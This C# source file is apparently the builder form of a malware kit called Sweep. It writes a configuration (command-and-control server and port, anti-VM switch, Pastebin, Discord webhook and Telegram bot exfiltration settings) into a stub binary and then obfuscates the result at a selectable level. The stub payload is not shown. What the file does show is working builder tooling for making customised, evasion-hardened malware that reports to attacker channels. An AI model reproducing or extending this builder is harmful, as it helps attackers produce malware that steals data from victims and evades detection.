using Guna.UI2.WinForms;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Sweep.Forms
{
    public partial class Builder : Form
    {
        Remembrance remembrance = new Remembrance();
        JObject config = new JObject
        {
            ["debug"] = false,
            ["binfile"] = false,
            ["antivm"] = true,

            ["server"] = "127.0.0.1",
            ["port"] = 6969,

            ["pastebin"] = false,
            ["pastebinlink"] = "",

            ["discord"] = false,
            ["webhook"] = "",

            ["telegram"] = false,
            ["tgid"] = -0,
            ["tgtoken"] = ""
        };

        public Builder()
        {
            InitializeComponent();
            closable.Visible = !remembrance.GetAttribute<bool>("close1");
            closable2.Visible = !remembrance.GetAttribute<bool>("close2");
            UpdateStatus("[ Ready ]", Color.LimeGreen);
            update();
        }

        /// <summary>
        /// Updates the status label with message and color
        /// </summary>
        /// <param name="message">Status message to display</param>
        /// <param name="color">Color for the status text</param>
        private void UpdateStatus(string message, Color color)
        {
            if (status.InvokeRequired)
            {
                status.Invoke(new Action(() => UpdateStatus(message, color)));
                return;
            }

            status.Text = message;
            status.ForeColor = color;
            status.Refresh(); // Force immediate UI update
            Application.DoEvents(); // Process pending UI events
        }

        /// <summary>
        /// Updates status with predefined styles for common states
        /// </summary>
        /// <param name="state">Predefined status state</param>
        /// <param name="customMessage">Optional custom message</param>
        private void UpdateStatusState(StatusState state, string customMessage = null)
        {
            switch (state)
            {
                case StatusState.Ready:
                    UpdateStatus("[ Ready ]", Color.LimeGreen);
                    break;
                case StatusState.Building:
                    UpdateStatus(customMessage ?? "[ Building... ]", Color.Orange);
                    break;
                case StatusState.Processing:
                    UpdateStatus(customMessage ?? "[ Processing... ]", Color.DeepSkyBlue);
                    break;
                case StatusState.Success:
                    UpdateStatus(customMessage ?? "[ Success ]", Color.LimeGreen);
                    break;
                case StatusState.Error:
                    UpdateStatus(customMessage ?? "[ Error ]", Color.Red);
                    break;
                case StatusState.Warning:
                    UpdateStatus(customMessage ?? "[ Warning ]", Color.Yellow);
                    break;
            }
        }

        private enum StatusState
        {
            Ready,
            Building,
            Processing,
            Success,
            Error,
            Warning
        }

        private void update()
        {
            UpdateStatusState(StatusState.Processing, "[ Updating Configuration... ]");

            foreach (TabPage tabPage in guna2TabControl1.TabPages)
            {
                foreach (Control ctrl in tabPage.Controls)
                {
                    if (ctrl.Tag == null || string.IsNullOrEmpty(ctrl.Tag.ToString()))
                        continue;

                    string tag = ctrl.Tag.ToString();

                    if (ctrl is Guna2ToggleSwitch btn)
                    {
                        if (remembrance.GetAttribute<bool>(tag))
                        {
                            btn.Checked = remembrance.GetAttribute<bool>(tag);
                        }
                        btn.CheckedChanged += (_, _) =>
                        {
                            remembrance.SetAttribute(tag, btn.Checked);
                        };
                        remembrance.SetAttribute(tag, btn.Checked);
                        config[tag] = btn.Checked;
                    }
                    else if (ctrl is Guna2TextBox txt)
                    {
                        var val = remembrance.GetAttribute<string>(tag);
                        if (!string.IsNullOrEmpty(val))
                        {
                            txt.Text = val;
                        }
                        remembrance.SetAttribute(tag, txt.Text);
                        config[tag] = txt.Text;
                    }
                }
            }

            UpdateStatusState(StatusState.Ready);
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            remembrance.SetAttribute("close1", true);
            closable.Visible = false;
            closable2.Left = closable.Left;
            closable2.Top = closable.Top;
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            remembrance.SetAttribute("close2", true);
            closable2.Visible = false;
        }

        private async void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            UpdateStatusState(StatusState.Building, "[ Preparing Build... ]");

            update();

            var dialog = builddialog.ShowDialog();
            if (dialog == DialogResult.OK)
            {
                var obfuscationLevelText = Obflevel.Text.Trim();

                // Start timing the operation
                var stopwatch = Stopwatch.StartNew();

                try
                {
                    UpdateStatusState(StatusState.Building, "[ Creating Temporary Stub... ]");

                    // Build the path to the temporary stub
                    string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "_temp.bin");

                    UpdateStatusState(StatusState.Processing, "[ Embedding Configuration... ]");

                    bool success = StubBuilder.ReplaceEmbeddedResourceFromString(
                        "./Extra/Stub.bin",
                        tempPath,
                        "config.json",
                        config.ToString()
                    );

                    if (!success)
                    {
                        UpdateStatusState(StatusState.Error, "[ Failed to Create Stub ]");
                        MessageBox.Show("Failed to create stub with embedded config!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }

                    UpdateStatusState(StatusState.Processing, "[ Cleaning Memory... ]");

                    // Add a small delay and force garbage collection to ensure file handles are released
                    await Task.Delay(100);
                    GC.Collect();
                    GC.WaitForPendingFinalizers();

                    UpdateStatusState(StatusState.Building, "[ Parsing Obfuscation Level... ]");

                    // Parse obfuscation level from UI
                    Obfuscator.EncryptionLevel encryptionLevel = ParseObfuscationLevel(obfuscationLevelText);

                    UpdateStatusState(StatusState.Building, $"[ Obfuscating ({encryptionLevel})... ]");

                    // Create obfuscator instance and obfuscate the file
                    var obfuscator = new Obfuscator();

                    // Run obfuscation in a task to keep UI responsive
                    await Task.Run(() => obfuscator.Obfuscate(tempPath, builddialog.FileName, encryptionLevel));

                    // Stop timing
                    stopwatch.Stop();

                    UpdateStatusState(StatusState.Success, $"[ Complete - {stopwatch.ElapsedMilliseconds}ms ]");

                    // Show success message
                    string message = $"DONE! {builddialog.FileName}\n" +
                                   $"Took {stopwatch.ElapsedMilliseconds}ms.";

                    MessageBox.Show(message, "Build Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);

                    // Return to ready state after a brief delay
                    await Task.Delay(2000);
                    UpdateStatusState(StatusState.Ready);
                }
                catch (Exception ex)
                {
                    stopwatch.Stop();
                    UpdateStatusState(StatusState.Error, "[ Build Failed ]");
                    MessageBox.Show($"Build failed: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                    // Return to ready state after error
                    await Task.Delay(3000);
                    UpdateStatusState(StatusState.Ready);
                }
                finally
                {
                    UpdateStatusState(StatusState.Processing, "[ Cleaning Up... ]");

                    // Clean up temporary file in finally block to ensure it gets deleted
                    string tempPath = Path.Combine(Path.GetTempPath(), "*_temp.bin");
                    try
                    {
                        var tempFiles = Directory.GetFiles(Path.GetTempPath(), "*_temp.bin");
                        foreach (var file in tempFiles)
                        {
                            if (File.Exists(file))
                            {
                                File.Delete(file);
                            }
                        }
                    }
                    catch
                    {
                        // Ignore cleanup errors
                    }
                }
            }
            else
            {
                UpdateStatusState(StatusState.Ready);
            }
        }

        /// <summary>
        /// Parse the obfuscation level text from the UI control
        /// </summary>
        /// <param name="levelText">Text from the obfuscation level control</param>
        /// <returns>Corresponding EncryptionLevel enum value</returns>
        private Obfuscator.EncryptionLevel ParseObfuscationLevel(string levelText)
        {
            if (string.IsNullOrEmpty(levelText))
                return Obfuscator.EncryptionLevel.Medium; // Default

            return levelText.ToLower().Trim() switch
            {
                "none" or "0" => Obfuscator.EncryptionLevel.None,
                "low" or "1" => Obfuscator.EncryptionLevel.Low,
                "medium" or "2" => Obfuscator.EncryptionLevel.Medium,
                "high" or "3" => Obfuscator.EncryptionLevel.High,
                _ => Obfuscator.EncryptionLevel.Medium // Default fallback
            };
        }
    }
}